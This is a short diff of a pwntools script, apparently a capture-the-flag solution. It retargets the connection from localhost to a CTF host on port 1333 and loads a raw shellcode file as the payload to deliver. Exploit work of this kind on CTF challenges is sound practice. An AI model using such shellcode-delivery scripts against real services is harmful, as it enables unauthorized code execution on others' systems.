@@ -1,5 +1,5 @@
 from pwn import *
-r = remote("127.0.0.1", 1333)
+r = remote("ctf.1337.ma", 1333)
 
 f= open("shellcode-raw",'rb')
 payload = f.read()
